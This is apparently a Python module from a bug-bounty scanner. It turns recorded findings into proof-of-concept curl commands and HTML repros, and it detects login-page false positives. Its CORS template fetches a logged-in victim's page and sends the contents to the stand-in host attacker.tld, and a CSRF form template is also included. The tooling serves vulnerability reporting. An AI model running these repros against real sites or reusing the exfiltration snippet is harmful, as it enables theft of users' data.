"""Proof-of-concept generation.

A finding triages faster (and pays better) when it ships a copy-paste
reproduction. This builds, from a finding's recorded request, a ready `curl`
command and — for client-side classes — a minimal HTML repro. Pure and
string-only so it unit-tests offline; the reporting layer renders the result.
"""
from __future__ import annotations

import re
import shlex
from typing import Any
from urllib.parse import urlparse

from .injection import parse_point
from .utils import merge_query

# client-side classes get an HTML repro instead of a curl
_CLIENT_SIDE = {"xss", "dom_xss", "stored_xss", "cors", "prototype_pollution", "csrf"}

# --- auth-wall detection: the false-positive killer for "reachable without auth"
# An app that 200s its login view (Laravel, most SPAs) trips naive
# "200 + body ⇒ privileged page" heuristics. A real PoC must prove the response
# is *privileged content*, not a login/redirect/deny page wearing a 200.
_LOGIN_TITLE_RE = re.compile(
    r"<title[^>]*>[^<]*\b(log[\s-]?in|sign[\s-]?in|sign[\s-]?on|"
    r"authenticate|unauthori[sz]ed|forbidden|access denied)\b", re.I)
_AUTH_TEXT_RE = re.compile(
    r"\b(401 unauthori[sz]ed|403 forbidden|access denied|"
    r"you (must|need to) (log|sign)\s*in|session (has )?expired|"
    r"please (log|sign)\s*in|please authenticate|login required)\b", re.I)
_LOGIN_HINT_RE = re.compile(r"\b(log[\s-]?in|sign[\s-]?in|password)\b", re.I)
_PASSWORD_FIELD_RE = re.compile(r"type=[\"']?password", re.I)
_ASSET_EXT = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
              ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webp")
_LOGIN_LOC_HINTS = ("login", "signin", "sign-in", "sign_in", "/auth", "sso",
                    "account/login", "oauth", "session/new")


def is_auth_wall(status: int, headers: dict[str, str] | None,
                 body: str | None, url: str = "") -> tuple[bool, str]:
    """Decide whether a response is an auth wall masquerading as content.

    Returns (is_wall, reason). Conservative on purpose — it only fires on
    unambiguous login/redirect/deny signals so it never drops a *real*
    privileged page, while reliably catching the login-view-200 false positive.
    """
    headers = {str(k).lower(): v for k, v in (headers or {}).items()}
    body = body or ""
    if status in (401, 403):
        return True, f"auth-required status {status}"
    if status in (301, 302, 303, 307, 308):
        loc = (headers.get("location") or "").lower()
        if any(h in loc for h in _LOGIN_LOC_HINTS):
            return True, f"redirects to an auth endpoint ({loc[:80]})"
    if _LOGIN_TITLE_RE.search(body):
        return True, "response <title> is a login / auth page"
    if _AUTH_TEXT_RE.search(body):
        return True, "response body states authentication is required"
    # a password field on a page that also talks about logging in ⇒ login form
    if _PASSWORD_FIELD_RE.search(body) and _LOGIN_HINT_RE.search(body):
        return True, "response contains a login form (password field)"
    return False, ""


def is_static_asset(url: str, headers: dict[str, str] | None) -> bool:
    """A JS/CSS/font/image URL returning 200 is not a privileged page."""
    headers = {str(k).lower(): v for k, v in (headers or {}).items()}
    path = urlparse(url or "").path.lower()
    if path.endswith(_ASSET_EXT):
        return True
    ct = (headers.get("content-type") or "").lower()
    return any(t in ct for t in ("javascript", "text/css", "image/", "font/",
                                 "application/font", "application/wasm"))


def proof_record(*, verified: bool, method: str, url: str, request: str,
                 status: int | None = None, excerpt: str = "",
                 rationale: str = "", samples: Any = None) -> dict[str, Any]:
    """A structured, captured proof attached to a finding once it is verified.

    This is the actual evidence a triager wants: the exact request sent, the
    response it produced, and a plain-English statement of why that proves the
    bug — not a curl string that reproduces nothing."""
    rec: dict[str, Any] = {
        "verified": verified, "method": method, "url": url, "request": request,
        "rationale": rationale,
    }
    if status is not None:
        rec["response_status"] = status
    if excerpt:
        rec["response_excerpt"] = excerpt[:1200]
    if samples is not None:
        rec["samples"] = samples
    return rec


def build_curl(finding: dict[str, Any]) -> str:
    """Reconstruct a curl command that reproduces the finding's request."""
    cat = (finding.get("category") or "").lower()
    if cat == "smuggling":
        # a plain curl reproduces *nothing* for a timing-oracle smuggle — be honest
        return _smuggling_repro(finding)
    url = finding.get("url") or ""
    method = _method(finding)
    param = finding.get("parameter") or ""
    payload = finding.get("payload") or ""
    kind, loc = parse_point(param) if param and ":" in param else ("query", param)

    headers: list[str] = []
    data = None
    target = url

    if param and payload:
        if kind == "header":
            headers.append(f"{loc}: {payload}")
        elif kind == "cookie":
            headers.append(f"Cookie: {loc}={payload}")
        elif kind == "json":
            # mirror injection._set_dotted: a dotted locator becomes a nested
            # JSON body, not a flat {"a.b": ...} key that reproduces nothing
            import json as _json
            from .injection import _set_dotted
            nested: dict[str, Any] = {}
            _set_dotted(nested, loc, payload)
            data = _json.dumps(nested)
            headers.append("Content-Type: application/json")
        elif kind == "query" and method == "GET" and loc and not loc.startswith("("):
            target = merge_query(url, {loc: payload})
        elif method in ("POST", "PUT", "PATCH") and loc and not loc.startswith("("):
            data = f"{loc}={payload}"

    parts = ["curl", "-sk", "-i"]
    if method != "GET":
        parts += ["-X", method]
    for h in headers:
        parts += ["-H", shlex.quote(h)]
    if data is not None:
        parts += ["--data", shlex.quote(data)]
    parts.append(shlex.quote(target))
    note = ""
    if finding.get("metadata", {}).get("session_a") or "auth" in (finding.get("evidence") or "").lower():
        note = "   # add the victim's session cookie/Authorization header to reproduce"
    return " ".join(parts) + note


def _smuggling_repro(finding: dict[str, Any]) -> str:
    """Honest repro for a timing-oracle smuggle: the raw request + how to confirm.

    Smuggling is proven with raw byte-level sockets and a reproducible timing
    differential, never with a single curl. We hand the triager the recorded
    request bytes and the confirmation procedure instead of a misleading curl."""
    kind = (finding.get("metadata") or {}).get("kind") or "smuggling"
    raw = finding.get("request") or finding.get("url") or ""
    elapsed = (finding.get("metadata") or {}).get("elapsed_s")
    when = f" (observed {elapsed:.2f}s hang)" if isinstance(elapsed, (int, float)) else ""
    return (
        f"# {kind} timing-oracle smuggle — reproduce with a raw socket (e.g. Burp Repeater,\n"
        f"# turbo-intruder, or `openssl s_client`), NOT curl.{when}\n"
        f"# 1. Send the payload shape below; it should hang ~>5s.\n"
        f"# 2. Send the inverse shape; it should return promptly.\n"
        f"# 3. A consistent differential across repeats confirms the parser disagreement.\n"
        f"{raw}")


def build_repro(finding: dict[str, Any]) -> str:
    """HTML repro for client-side bugs, else the curl command."""
    cat = (finding.get("category") or "").lower()
    url = finding.get("url") or ""
    if cat == "smuggling":
        return _smuggling_repro(finding)
    if cat == "cors":
        return (
            "<!doctype html><script>\n"
            f"// Host on attacker.tld, open while logged in to {urlparse(url).netloc}\n"
            f"fetch('{url}', {{credentials:'include'}})\n"
            "  .then(r => r.text())\n"
            "  .then(d => new Image().src='https://attacker.tld/x?'+encodeURIComponent(d));\n"
            "</script>")
    if cat in ("xss", "stored_xss", "dom_xss"):
        return f"<!-- Visit while authenticated -->\n{url}\n<!-- payload: {finding.get('payload','')} -->"
    if cat == "prototype_pollution":
        return f"{url}\n// then check Object.prototype in DevTools console"
    if cat == "csrf":
        return (f'<form action="{url}" method="POST">\n'
                '  <!-- attacker-controlled fields here -->\n'
                '  <input type="submit">\n</form>')
    return build_curl(finding)


def annotate_poc(finding: dict[str, Any]) -> None:
    """Attach poc_curl + poc to a finding in place (best-effort)."""
    try:
        finding["poc_curl"] = build_curl(finding)
        repro = build_repro(finding)
        if repro and not finding.get("poc"):
            finding["poc"] = repro
    except Exception:
        pass


def _method(finding: dict[str, Any]) -> str:
    req = (finding.get("request") or "").strip()
    if req:
        head = req.split(None, 1)[0].upper()
        if head in ("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"):
            return head
    m = (finding.get("metadata") or {}).get("method")
    return (m or "GET").upper()
